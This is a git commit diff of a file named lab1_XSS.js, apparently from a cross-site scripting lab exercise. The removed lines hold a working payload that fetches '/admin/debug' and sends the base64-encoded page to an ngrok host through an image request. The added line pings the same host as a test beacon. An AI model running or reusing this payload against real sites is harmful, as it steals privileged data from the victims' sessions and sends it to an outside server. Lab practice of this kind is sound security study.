6acf40d4eebdbb5b915521ab49e1b3ff606ac34b
glno815 <78334532+glno815@users.noreply.github.com>
2026-03-16 21:31:46 +0700

    Update lab1_XSS.js

--- lab1_XSS.js
+++ lab1_XSS.js
@@ -1,5 +1,1 @@
-fetch('/admin/debug')
-.then(r => r.text())
-.then(d => {
-    new Image().src="https://30a8-2402-800-61c7-539d-60ad-28f0-6942-5ea2.ngrok-free.app?d="+btoa(d)
-})
+new Image().src="https://30a8-2402-800-61c7-539d-60ad-28f0-6942-5ea2.ngrok-free.app?ping=test";
